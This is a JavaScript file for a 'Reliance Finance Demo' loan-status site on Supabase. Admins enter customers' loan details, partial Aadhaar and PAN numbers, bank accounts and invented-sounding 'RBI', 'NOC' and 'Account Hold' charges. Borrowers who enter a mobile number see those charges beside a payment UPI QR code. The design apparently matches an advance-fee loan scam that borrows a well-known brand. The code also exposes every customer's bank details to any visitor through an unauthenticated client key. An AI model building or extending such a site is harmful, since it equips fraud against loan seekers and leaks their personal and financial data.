/* =========================================
   RELIANCE FINANCE DEMO
   SUPABASE DATABASE SCRIPT
========================================= */


/* =========================================
   SUPABASE CONFIG
========================================= */

const SUPABASE_URL =
   "https://slmrlsfvtvwbldmxmerm.supabase.co"

const SUPABASE_KEY =
    "sb_publishable_u0SeUzjIT67vw8qXh12gEw_K_-oXvGW"


/* =========================================
   DATABASE HEADERS
========================================= */

const SUPABASE_HEADERS = {

    "apikey": SUPABASE_KEY,

    "Authorization":
        "Bearer " + SUPABASE_KEY,

    "Content-Type":
        "application/json",

    "Prefer":
        "return=representation"

};


/* =========================================
   CUSTOMER STATE
========================================= */

let editingCustomerId = null;

const customerForm =
    document.getElementById("customerForm");


/* =========================================
   HTML SECURITY
========================================= */

function escapeHtml(value) {

    if (value === null || value === undefined) {
        return "";
    }

    return String(value)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");

}


/* =========================================
   MASK AADHAAR
========================================= */

function maskAadhaar(last4) {

    if (!last4) {
        return "-";
    }

    return "xxxxxxxx" + last4;

}


/* =========================================
   MASK PAN
========================================= */

function maskPan(last4) {

    if (!last4) {
        return "-";
    }

    return "xxxxxx" + last4;

}


/* =========================================
   CHARGE DESCRIPTION
========================================= */

function getChargeDescription(charge) {

    switch (charge) {

        case "RBI Charge":
            return "RBI-related information is shown according to the application details.";

        case "NOC Charge":
            return "NOC-related information is shown according to the application details.";

        case "TDS":
            return "TDS-related information is shown according to the application details.";

        case "Account Hold Charge":
            return "Account hold information is shown according to the application details.";

        case "Processing Charge":
            return "Processing information is shown according to the application details.";

        case "Verification Charge":
            return "Verification information is shown according to the application details.";

        case "Documentation Charge":
            return "Documentation information is shown according to the application details.";

        case "GST":
            return "GST information is shown according to the application details.";

        case "Insurance Charge":
            return "Insurance information is shown according to the application details.";

        case "Other Charge":
            return "Additional charge information is shown according to the application details.";

        default:
            return "Charge information is shown according to the application details.";

    }

}


/* =========================================
   ADMIN MESSAGE
========================================= */

function showAdminMessage(message, color) {

    const box =
        document.getElementById("adminMessage");

    if (!box) {
        return;
    }

    box.innerText = message;

    box.style.marginTop = "15px";

    box.style.fontWeight = "bold";

    box.style.color = color;

}


/* =========================================
   SUBMIT BUTTON
========================================= */

function setSubmitButton(text) {

    if (!customerForm) {
        return;
    }

    const button =
        customerForm.querySelector(
            'button[type="submit"]'
        );

    if (button) {
        button.innerText = text;
    }

}


/* =========================================
   GET CUSTOMERS
========================================= */

async function getCustomers() {

    try {

        const response =
            await fetch(
                SUPABASE_URL +
                "/rest/v1/customers?select=*&order=id.desc",
                {
                    method: "GET",
                    headers: SUPABASE_HEADERS
                }
            );


        if (!response.ok) {

            const errorText =
                await response.text();

            throw new Error(errorText);

        }


        return await response.json();

    }

    catch (error) {

        console.error(
            "Supabase Load Error:",
            error
        );

        return [];

    }

}


/* =========================================
   SAVE CUSTOMER
========================================= */

async function saveCustomer(customer) {

    try {

        const response =
            await fetch(
                SUPABASE_URL +
                "/rest/v1/customers",
                {
                    method: "POST",
                    headers: SUPABASE_HEADERS,
                    body: JSON.stringify(customer)
                }
            );


        if (!response.ok) {

            const errorText =
                await response.text();

            throw new Error(errorText);

        }


        return true;

    }

    catch (error) {

        console.error(
            "Supabase Save Error:",
            error
        );

        return false;

    }

}


/* =========================================
   UPDATE CUSTOMER
========================================= */

async function updateCustomer(id, customer) {

    try {

        const response =
            await fetch(
                SUPABASE_URL +
                "/rest/v1/customers?id=eq." +
                encodeURIComponent(id),
                {
                    method: "PATCH",
                    headers: SUPABASE_HEADERS,
                    body: JSON.stringify(customer)
                }
            );


        if (!response.ok) {

            const errorText =
                await response.text();

            throw new Error(errorText);

        }


        return true;

    }

    catch (error) {

        console.error(
            "Supabase Update Error:",
            error
        );

        return false;

    }

}


/* =========================================
   SAVE / UPDATE CUSTOMER
========================================= */

if (customerForm) {

    customerForm.addEventListener(
        "submit",
        async function (event) {

            event.preventDefault();


            const customer = {

                customer_name:
                    document
                        .getElementById("customerName")
                        .value
                        .trim(),

                mobile_number:
                    document
                        .getElementById("mobileNumber")
                        .value
                        .trim(),

                loan_type:
                    document
                        .getElementById("loanType")
                        .value,

                loan_amount:
                    document
                        .getElementById("loanAmount")
                        .value || null,

                aadhaar_last4:
                    document
                        .getElementById("aadhaarLast4")
                        .value
                        .trim(),

                pan_last4:
                    document
                        .getElementById("panLast4")
                        .value
                        .trim(),

                return_year:
                    document
                        .getElementById("returnYear")
                        .value
                        .trim(),

                charge:
                    document
                        .getElementById("charge")
                        .value,

                charge_amount:
                    document
                        .getElementById("chargeAmount")
                        .value || null,

                percentage:
                    document
                        .getElementById("percentage")
                        .value || 0,

                bank_name:
                    document
                        .getElementById("bankName")
                        .value
                        .trim(),

                account_holder_name:
                    document
                        .getElementById("accountHolderName")
                        .value
                        .trim(),

                account_number:
                    document
                        .getElementById("accountNumber")
                        .value
                        .trim(),

                ifsc_code:
                    document
                        .getElementById("ifscCode")
                        .value
                        .trim(),

                upi_number:
                    document
                        .getElementById("upiNumber")
                        .value
                        .trim(),

                submitted_at:
                    new Date().toLocaleString()

            };


            if (
                !/^[0-9]{10}$/.test(
                    customer.mobile_number
                )
            ) {

                showAdminMessage(
                    "Please enter a valid 10 digit mobile number.",
                    "red"
                );

                return;

            }


            if (
                customer.aadhaar_last4 &&
                !/^[0-9]{4}$/.test(
                    customer.aadhaar_last4
                )
            ) {

                showAdminMessage(
                    "Aadhaar में केवल आखिरी 4 digits डालें.",
                    "red"
                );

                return;

            }


            if (
                customer.pan_last4 &&
                !/^[A-Za-z0-9]{4}$/.test(
                    customer.pan_last4
                )
            ) {

                showAdminMessage(
                    "PAN में केवल आखिरी 4 characters डालें.",
                    "red"
                );

                return;

            }


            if (
                customer.percentage !== null &&
                (
                    Number(customer.percentage) < 0 ||
                    Number(customer.percentage) > 100
                )
            ) {

                showAdminMessage(
                    "Progress 0 से 100 के बीच होना चाहिए.",
                    "red"
                );

                return;

            }


            if (editingCustomerId !== null) {

                showAdminMessage(
                    "Updating customer...",
                    "#0757a8"
                );


                const success =
                    await updateCustomer(
                        editingCustomerId,
                        customer
                    );


                if (!success) {

                    showAdminMessage(
                        "Customer update failed.",
                        "red"
                    );

                    return;

                }


                showAdminMessage(
                    "Customer details updated successfully.",
                    "green"
                );


                editingCustomerId =
                    null;


                customerForm.reset();


                setSubmitButton(
                    "Submit Customer"
                );


                loadCustomers();

                return;

            }


            showAdminMessage(
                "Saving customer...",
                "#0757a8"
            );


            const success =
                await saveCustomer(
                    customer
                );


            if (!success) {

                showAdminMessage(
                    "Customer save failed.",
                    "red"
                );

                return;

            }


            showAdminMessage(
                "Customer details saved successfully.",
                "green"
            );


            customerForm.reset();

            loadCustomers();

        }
    );

}


/* =========================================
   EDIT CUSTOMER
========================================= */

async function editCustomer(id) {

    const customers =
        await getCustomers();


    const customer =
        customers.find(
            function (item) {

                return Number(item.id) ===
                    Number(id);

            }
        );


    if (!customer) {

        showAdminMessage(
            "Customer not found.",
            "red"
        );

        return;

    }


    editingCustomerId =
        customer.id;


    document.getElementById("customerName").value =
        customer.customer_name || "";

    document.getElementById("mobileNumber").value =
        customer.mobile_number || "";

    document.getElementById("loanType").value =
        customer.loan_type || "";

    document.getElementById("loanAmount").value =
        customer.loan_amount || "";

    document.getElementById("aadhaarLast4").value =
        customer.aadhaar_last4 || "";

    document.getElementById("panLast4").value =
        customer.pan_last4 || "";

    document.getElementById("returnYear").value =
        customer.return_year || "";

    document.getElementById("charge").value =
        customer.charge || "";

    document.getElementById("chargeAmount").value =
        customer.charge_amount || "";

    document.getElementById("percentage").value =
        customer.percentage || "";

    document.getElementById("bankName").value =
        customer.bank_name || "";

    document.getElementById("accountHolderName").value =
        customer.account_holder_name || "";

    document.getElementById("accountNumber").value =
        customer.account_number || "";

    document.getElementById("ifscCode").value =
        customer.ifsc_code || "";

    document.getElementById("upiNumber").value =
        customer.upi_number || "";


    setSubmitButton(
        "Update Customer"
    );


    window.scrollTo({
        top: 0,
        behavior: "smooth"
    });


    showAdminMessage(
        "Customer details loaded for editing.",
        "#0757a8"
    );

}


/* =========================================
   LOAD CUSTOMERS
========================================= */

async function loadCustomers() {

    const list =
        document.getElementById(
            "customerList"
        );


    if (!list) {
        return;
    }


    list.innerHTML =
        "<p>Loading customer data...</p>";


    const customers =
        await getCustomers();


    if (
        !customers ||
        customers.length === 0
    ) {

        list.innerHTML =
            "<p>No customer data available.</p>";

        return;

    }


    list.innerHTML = "";


    customers.forEach(
        function (customer) {

            const box =
                document.createElement("div");


            box.className =
                "customer-record";


            box.innerHTML = `

                <p>
                    <b>Customer:</b>
                    ${escapeHtml(
                        customer.customer_name || "-"
                    )}
                </p>

                <p>
                    <b>Mobile:</b>
                    ${escapeHtml(
                        customer.mobile_number || "-"
                    )}
                </p>

                <p>
                    <b>Loan Type:</b>
                    ${escapeHtml(
                        customer.loan_type || "-"
                    )}
                </p>

                <p>
                    <b>Loan Amount:</b>
                    ₹${Number(
                        customer.loan_amount || 0
                    ).toLocaleString("en-IN")}
                </p>

                <p>
                    <b>Aadhaar:</b>
                    ${escapeHtml(
                        maskAadhaar(
                            customer.aadhaar_last4
                        )
                    )}
                </p>

                <p>
                    <b>PAN:</b>
                    ${escapeHtml(
                        maskPan(
                            customer.pan_last4
                        )
                    )}
                </p>

                <p>
                    <b>Return Period:</b>
                    ${escapeHtml(
                        customer.return_year || "-"
                    )}
                </p>

                <p>
                    <b>Charge:</b>
                    ${escapeHtml(
                        customer.charge || "-"
                    )}
                </p>

                <p>
                    <b>Charge Amount:</b>
                    ₹${Number(
                        customer.charge_amount || 0
                    ).toLocaleString("en-IN")}
                </p>

                <p>
                    <b>Application Progress:</b>
                    ${Number(
                        customer.percentage || 0
                    )}%
                </p>

                <hr>

                <p>
                    <b>Bank Name:</b>
                    ${escapeHtml(
                        customer.bank_name || "-"
                    )}
                </p>

                <p>
                    <b>Account Holder:</b>
                    ${escapeHtml(
                        customer.account_holder_name || "-"
                    )}
                </p>

                <p>
                    <b>Account Number:</b>
                    ${escapeHtml(
                        customer.account_number || "-"
                    )}
                </p>

                <p>
                    <b>IFSC Code:</b>
                    ${escapeHtml(
                        customer.ifsc_code || "-"
                    )}
                </p>

                <p>
                    <b>UPI ID:</b>
                    ${escapeHtml(
                        customer.upi_number || "-"
                    )}
                </p>

                <p>
                    <b>Submitted:</b>
                    ${escapeHtml(
                        customer.submitted_at || "-"
                    )}
                </p>

                <button
                    type="button"
                    class="edit-customer-btn"
                    onclick="editCustomer(${Number(
                        customer.id
                    )})">

                    Edit Customer

                </button>

            `;


            list.appendChild(box);

        }
    );

}


/* =========================================
   INITIAL ADMIN LOAD
========================================= */

loadCustomers();


/* =========================================
   CHECK STATUS
========================================= */

async function checkStatus() {

    const mobileInput =
        document.getElementById(
            "mobileNumber"
        );


    const result =
        document.getElementById(
            "statusResult"
        );


    if (
        !mobileInput ||
        !result
    ) {

        return;

    }


    const mobile =
        mobileInput.value.trim();


    if (
        !/^[0-9]{10}$/.test(
            mobile
        )
    ) {

        result.innerHTML = `

            <p class="status-error">

                Please enter a valid 10 digit mobile number.

            </p>

        `;

        return;

    }


    result.innerHTML = `

        <p>
            Checking application...
        </p>

    `;


    try {

        const response =
            await fetch(
                SUPABASE_URL +
                "/rest/v1/customers?select=*&mobile_number=eq." +
                encodeURIComponent(mobile) +
                "&limit=1",
                {
                    method: "GET",
                    headers: SUPABASE_HEADERS
                }
            );


        if (!response.ok) {

            const errorText =
                await response.text();

            throw new Error(errorText);

        }


        const customers =
            await response.json();


        const customer =
            customers[0];


        if (!customer) {

            result.innerHTML = `

                <p class="status-error">

                    No application found.

                </p>

            `;

            return;

        }


        renderStatus(
            customer,
            result
        );

    }

    catch (error) {

        console.error(
            "Status Error:",
            error
        );


        result.innerHTML = `

            <p class="status-error">

                Unable to load application status.

            </p>

        `;

    }

}


/* =========================================
   RENDER STATUS
========================================= */

function renderStatus(
    customer,
    result
) {

    const percentage =
        Math.max(
            0,
            Math.min(
                100,
                Number(
                    customer.percentage || 0
                )
            )
        );


    const chargeAmount =
        Number(
            customer.charge_amount || 0
        ).toLocaleString("en-IN");


    result.innerHTML = `

        <div class="status-card">

            <div class="status-header">

                <div>

                    <span class="small-label">
                        Customer
                    </span>

                    <h3>
                        ${escapeHtml(
                            customer.customer_name ||
                            "Customer"
                        )}
                    </h3>

                </div>

                <span class="status-badge">
                    Application Status
                </span>

            </div>


            <div class="progress-section">

                <div class="progress-title">

                    <span>
                        Application Progress
                    </span>

                    <b>
                        ${percentage}%
                    </b>

                </div>


                <div class="progress-box">

                    <div
                        class="progress-bar"
                        style="width:${percentage}%">

                        ${percentage}%

                    </div>

                </div>

            </div>


            <div class="status-details">

                <div class="status-section-title">

                    Customer Name:
                    ${escapeHtml(
                        customer.customer_name ||
                        "Customer"
                    )}

                </div>


                <div class="detail-item">

                    <span>
                        Loan Type
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.loan_type || "-"
                        )}
                    </b>

                </div>


                <div class="detail-item">

                    <span>
                        Loan Amount
                    </span>

                    <b>
                        ₹${Number(
                            customer.loan_amount || 0
                        ).toLocaleString("en-IN")}
                    </b>

                </div>


                <div class="detail-item">

                    <span>
                        Mobile Number
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.mobile_number || "-"
                        )}
                    </b>

                </div>


                <div class="detail-item">

                    <span>
                        Return Period
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.return_year || "-"
                        )}
                    </b>

                </div>

            </div>


            <!-- APPLICABLE CHARGE -->

            <div class="charge-box">

                <div class="status-section-title">

                    📌 Applicable Charge

                </div>


                <div class="charge-row">

                    <span>
                        Charge Type
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.charge || "-"
                        )}
                    </b>

                </div>


                <div class="charge-amount-box">

                    <span>
                        Amount
                    </span>

                    <strong>
                        ₹${chargeAmount}
                    </strong>

                </div>


                <div class="charge-description">

                    <strong>
                        ${escapeHtml(
                            customer.charge ||
                            "Charge Information"
                        )}
                    </strong>

                    <p>
                        ${escapeHtml(
                            getChargeDescription(
                                customer.charge
                            )
                        )}
                    </p>

                </div>

            </div>


            <!-- VERIFICATION -->

            <div class="identity-details">

                <div class="status-section-title">
                    Verification Details
                </div>


                <div class="detail-row">

                    <span>
                        Aadhaar
                    </span>

                    <b>
                        ${escapeHtml(
                            maskAadhaar(
                                customer.aadhaar_last4
                            )
                        )}
                    </b>

                </div>


                <div class="detail-row">

                    <span>
                        PAN
                    </span>

                    <b>
                        ${escapeHtml(
                            maskPan(
                                customer.pan_last4
                            )
                        )}
                    </b>

                </div>

            </div>


            <!-- ACCOUNT INFORMATION -->

            <div class="bank-details">

                <div class="status-section-title">

                    💳 Account Information

                </div>


                <div class="detail-row">

                    <span>
                        Bank Name
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.bank_name || "-"
                        )}
                    </b>

                </div>


                <div class="detail-row">

                    <span>
                        Account Holder
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.account_holder_name ||
                            "-"
                        )}
                    </b>

                </div>


                <div class="detail-row">

                    <span>
                        Account Number
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.account_number ||
                            "-"
                        )}
                    </b>

                </div>


                <div class="detail-row">

                    <span>
                        IFSC Code
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.ifsc_code ||
                            "-"
                        )}
                    </b>

                </div>


                <div class="detail-row">

                    <span>
                        UPI ID
                    </span>

                    <b>
                        ${escapeHtml(
                            customer.upi_number ||
                            "-"
                        )}
                    </b>

                </div>


                <!-- DEMO QR -->

                <div class="demo-qr-section">

                    <h3>
                        📱 UPI QR
                    </h3>

                    <div
                        id="upiQrCode"
                        class="upi-qr-code">
                    </div>

                    <p>
                         QR generated from the
                        UPI information.
                    </p>

                </div>


                <div class="payment-info-box">

                    <strong>
                        Account Information
                    </strong>

                    <p>
                        Account Information

The account information and QR code displayed above are provided for reference purposes only. Please verify all details through the official source before use.
                    </p>

                </div>

            </div>

        </div>


        <p class="status-demo-text">

            Application information for
            demonstration purposes.

        </p>

    `;


    /* =========================================
       GENERATE DEMO QR
    ========================================= */

    const qrBox =
        document.getElementById(
            "upiQrCode"
        );


    if (
        qrBox &&
        customer.upi_number &&
        typeof QRCode !== "undefined"
    ) {

        qrBox.innerHTML = "";


        new QRCode(
            qrBox,
            {
                text:
                    String(
                        customer.upi_number
                    ),

                width: 180,

                height: 180
            }
        );

    }

}


/* =========================================
   MOBILE HAMBURGER MENU
========================================= */

const menuBtn =
    document.getElementById(
        "menuBtn"
    );


const mainNav =
    document.getElementById(
        "mainNav"
    );


if (
    menuBtn &&
    mainNav
) {

    menuBtn.addEventListener(
        "click",
        function () {

            mainNav.classList.toggle(
                "menu-open"
            );

        }
    );


    const menuLinks =
        mainNav.querySelectorAll(
            "a"
        );


    menuLinks.forEach(
        function (link) {

            link.addEventListener(
                "click",
                function () {

                    mainNav.classList.remove(
                        "menu-open"
                    );

                }
            );

        }
    );

}
